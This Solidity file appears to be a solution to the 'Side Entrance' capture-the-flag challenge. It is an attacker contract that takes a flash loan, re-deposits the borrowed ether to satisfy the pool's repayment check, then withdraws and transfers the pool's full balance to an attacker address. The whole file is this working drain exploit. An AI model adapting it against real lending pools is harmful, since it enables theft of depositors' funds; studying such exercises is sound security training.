// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {

    ISideEntranceLenderPool pool;
    uint256 poolBalance;

    constructor() {}

    function attack(address poolAdd, address payable attackerEOA) public{
        pool = ISideEntranceLenderPool(poolAdd);
        poolBalance = address(pool).balance;

        // calls execute, then checks pool balance
        pool.flashLoan(poolBalance);
        // withdraws money from pool to "this"
        pool.withdraw();
        // Transfers money to attacker
        attackerEOA.transfer(poolBalance);
    }

    function execute() external payable {
        // Deposit the tokens to the attacker contract -> pool contract balance is constant
        pool.deposit{value: poolBalance}();
    }

    // Required for pool.withdraw()
    receive() external payable {}
}